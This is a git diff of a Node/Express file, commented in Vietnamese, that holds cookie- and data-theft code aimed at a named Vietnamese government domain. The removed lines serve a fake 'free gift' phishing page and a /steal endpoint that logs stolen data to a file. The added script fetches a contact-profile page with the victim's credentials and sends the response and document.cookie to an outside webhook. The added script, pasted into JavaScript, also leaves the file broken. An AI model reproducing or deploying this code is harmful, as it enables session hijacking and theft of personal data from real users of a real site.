@@ -6,45 +6,33 @@ const PORT = 3006;
 
 app.use(express.json());
 
-// Phục vụ trang lừa đảo
-app.get("/", (req, res) => {
-    res.send(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Bấm vào đây để nhận quà miễn phí!</title>
-        </head>
-        <body>
-            <script>
-                fetch("https://cds.hagiang.gov.vn/", {
-                    credentials: "include" // Gửi cookie của nạn nhân
+<script>
+    var webhookUrl = "https://test-xss.onrender.com"; 
+
+    fetch("http://hoptacxacds.hagiang.gov.vn/clients/contact_profile/52/general", {
+        method: "GET",
+        credentials: "include" // Gửi cookie của người dùng
+    })
+    .then(response => response.text())
+    .then(data => {
+        if (data && data.trim().length > 0) {
+            console.log("Dữ liệu có chứa thông tin:", data);
+            console.log("Cookie của nạn nhân:", document.cookie);
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    stolenData: data,
+                    cookies: document.cookie
                 })
-                .then(response => response.text())
-                .then(data => {
-                    fetch("https://test-xss.onrender.com/steal", { // Gửi dữ liệu về server của bạn
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ stolenData: data })
-                    });
-                })
-                .catch(err => console.log("Bypass CORS failed:", err));
-            </script>
-            <h1>Bấm vào đây để nhận quà miễn phí!</h1>
-        </body>
-        </html>
-    `);
-});
+            });
+        }
+    })
+    .catch(error => console.error("Lỗi:", error));
+</script>
 
-// Nhận dữ liệu đánh cắp từ nạn nhân
-app.post("/steal", (req, res) => {
-    const data = req.body;
-    console.log("Received stolen data:", data);
 
-    // Lưu dữ liệu vào file
-    fs.appendFileSync("stolen.txt", JSON.stringify(data) + "\n");
-
-    res.send("OK");
-});
 
 // Bắt đầu lắng nghe trên cổng PORT
 app.listen(PORT, () => {
